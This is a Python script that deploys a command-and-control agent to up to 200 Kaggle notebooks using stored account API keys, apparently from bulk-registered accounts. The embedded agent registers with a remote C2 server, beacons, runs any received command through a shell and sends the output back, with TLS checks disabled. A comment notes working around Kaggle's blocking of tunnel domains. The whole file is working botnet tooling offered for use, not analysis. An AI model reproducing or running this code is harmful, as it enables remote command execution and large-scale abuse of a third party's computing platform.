#!/usr/bin/env python3
"""Run batch-join-c2 logic directly (bypasses HTTP)."""
import sys
import os
from pathlib import Path

# Load config
def get_config(key, default=""):
    import sqlite3
    conn = sqlite3.connect(Path(__file__).resolve().parent.parent / "data" / "c2.db")
    conn.row_factory = sqlite3.Row
    row = conn.execute("SELECT value FROM config WHERE key=?", (key,)).fetchone()
    conn.close()
    return row["value"] if row else default

def _get_public_url():
    # Kaggle may block trycloudflare.com - use public_url_kaggle if set (e.g. http://kaggle2.ddns.net:18443)
    u = get_config("public_url_kaggle", "").strip()
    if u and (u.startswith("http://") or u.startswith("https://")):
        return u.rstrip("/")
    u = get_config("public_url", "").strip()
    if u and (u.startswith("http://") or u.startswith("https://")):
        return u.rstrip("/")
    return ""

# Import after path setup
from autoreg.engine import account_store
import json
import subprocess

def _get_account_kernels(username, api_key):
    """Get real kernel slugs from Kaggle API (kaggle kernels list --mine)."""
    kaggle_dir = Path.home() / ".kaggle"
    kaggle_dir.mkdir(parents=True, exist_ok=True)
    (kaggle_dir / "kaggle.json").write_text(json.dumps({"username": username, "key": api_key}))
    (kaggle_dir / "kaggle.json").chmod(0o600)
    try:
        r = subprocess.run(["kaggle", "kernels", "list", "--mine"], capture_output=True, text=True, timeout=30)
        if r.returncode != 0:
            return []
        slugs = []
        for line in r.stdout.strip().split("\n")[2:]:
            parts = line.split()
            if parts and "/" in parts[0]:
                slugs.append(parts[0].strip())
        return slugs
    except Exception:
        return []

# Load accounts
accounts = account_store.get_all()
c2_url = _get_public_url()
if not c2_url:
    print("ERROR: No Public URL set. Configure in Settings.")
    sys.exit(1)

def _valid_api_key(key):
    if not key or not isinstance(key, str):
        return False
    key = key.strip()
    if key in ("???", "xxx", "..."):
        return False
    return len(key) >= 20  # legacy ~32 hex, KGAT_ longer

targets = []
for a in accounts:
    if a.get("platform") != "kaggle":
        continue
    api_key = a.get("api_key_legacy") or a.get("api_key_new") or ""
    if not _valid_api_key(api_key):
        continue
    username = a.get("kaggle_username") or a.get("username", "")
    if not username:
        continue
    slugs = _get_account_kernels(username, api_key)
    if not slugs:
        slugs = [m.get("slug", m) if isinstance(m, dict) else m for m in (a.get("machines") or []) if m]
    for slug in slugs:
        if slug and isinstance(slug, str):
            targets.append({"username": username, "api_key": api_key, "kernel_slug": slug, "email": a.get("email", "")})

if not targets:
    print("ERROR: No Kaggle machines with API keys found.")
    sys.exit(1)

# Limit for quick test: pass --quick to deploy ALL machines of the FIRST account only
import sys
quick = "--quick" in sys.argv
if quick and targets:
    first_user = targets[0]["username"]
    targets = [t for t in targets if t["username"] == first_user]
elif not quick:
    targets = targets[:200]
print(f"Public URL: {c2_url}")
print(f"Targets: {len(targets)} machines")
print("Starting batch deploy...")

# Agent code - must match server.py KAGGLE_C2_AGENT_CODE
# Uses requests (Kaggle has it); verify=False for Cloudflare tunnel
# KERNEL_SLUG injected per-target for stable agent_id
KAGGLE_C2_AGENT_CODE = '''import os,sys,json,time,socket,platform,subprocess,hashlib,threading
import urllib3
urllib3.disable_warnings()
try: import requests
except: requests=None
C2_URL="{c2_url}"
KERNEL_SLUG="{kernel_slug}"
AGENT_ID=hashlib.sha256(("kaggle:"+KERNEL_SLUG).encode()).hexdigest()[:16]
def _post(path,data):
    for _ in range(5):
        try:
            if requests:
                r=requests.post(C2_URL+path,json=data,timeout=25,verify=False)
                return r.json() if r.ok else {{"tasks":[]}}
            import urllib.request
            req=urllib.request.Request(C2_URL+path,data=json.dumps(data).encode(),headers={{"Content-Type":"application/json"}})
            import ssl
            ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
            return json.loads(urllib.request.urlopen(req,timeout=25,context=ctx).read())
        except Exception: time.sleep(3)
    return {{"tasks":[]}}
def register():
    info={{"id":AGENT_ID,"hostname":"kaggle-"+KERNEL_SLUG.replace("/","-"),"username":os.popen("whoami").read().strip(),"os":"Kaggle "+platform.system(),"arch":platform.machine(),"ip_internal":socket.gethostname(),"platform_type":"kaggle"}}
    return _post("/api/agent/register",info)
def beacon():
    while True:
        try:
            r=_post("/api/agent/beacon",{{"id":AGENT_ID}})
            for t in r.get("tasks",[]):
                out=subprocess.check_output(t.get("payload",""),shell=True,stderr=subprocess.STDOUT,timeout=300).decode(errors="replace")
                _post("/api/agent/result",{{"task_id":t["id"],"result":out[:65000]}})
        except: pass
        time.sleep(5)
register()
threading.Thread(target=beacon,daemon=True).start()
while True: time.sleep(60)
'''

def _deploy_code_to_kernel(username, api_key, kernel_slug, code):
    import subprocess as _sp
    import tempfile
    kaggle_dir = Path.home() / ".kaggle"
    kaggle_dir.mkdir(parents=True, exist_ok=True)
    (kaggle_dir / "kaggle.json").write_text(json.dumps({"username": username, "key": api_key}))
    (kaggle_dir / "kaggle.json").chmod(0o600)
    # Use slug as-is: Kaggle accepts both machine_1_... and machine-1-... depending on creation
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            tmp = Path(tmpdir)
            r = _sp.run(["kaggle", "kernels", "pull", kernel_slug, "-p", tmpdir, "-m"], capture_output=True, text=True, timeout=60)
            if r.returncode != 0:
                err = (r.stderr or r.stdout or "").strip()[:200]
                if err:
                    print(f"  Kaggle: {err}", end=" ")
                return False
            nb_files = list(tmp.glob("*.ipynb"))
            if not nb_files:
                return False
            nb = json.loads(nb_files[0].read_text())
            lines = [line + "\n" for line in code.split("\n")]
            nb["cells"] = [{"cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [], "source": lines}]
            nb_files[0].write_text(json.dumps(nb, indent=2))
            meta_path = tmp / "kernel-metadata.json"
            meta = json.loads(meta_path.read_text()) if meta_path.exists() else {}
            meta.update({
                "id": kernel_slug,
                "title": kernel_slug.split("/")[-1].replace("-", " "),
                "code_file": nb_files[0].name,
                "language": "python",
                "kernel_type": "notebook",
                "is_private": True,
                "enable_gpu": True,
                "enable_tpu": False,
                "enable_internet": True,
            })
            meta.setdefault("dataset_sources", [])
            meta.setdefault("competition_sources", [])
            meta.setdefault("kernel_sources", [])
            meta.setdefault("model_sources", [])
            meta_path.write_text(json.dumps(meta, indent=2))
            r2 = _sp.run(["kaggle", "kernels", "push", "-p", tmpdir], capture_output=True, text=True, timeout=120)
            return r2.returncode == 0
    except Exception as e:
        print(f"  Exception: {e}")
        return False

success = 0
failed = 0
for i, t in enumerate(targets):
    print(f"[{i+1}/{len(targets)}] {t['email']} / {t['kernel_slug']}...", end=" ", flush=True)
    code = KAGGLE_C2_AGENT_CODE.format(c2_url=c2_url, kernel_slug=t["kernel_slug"])
    ok = _deploy_code_to_kernel(t["username"], t["api_key"], t["kernel_slug"], code)
    if ok:
        success += 1
        print("OK")
    else:
        failed += 1
        print("FAIL")
    import time
    time.sleep(1)

print(f"\nDone: {success} ok, {failed} failed")
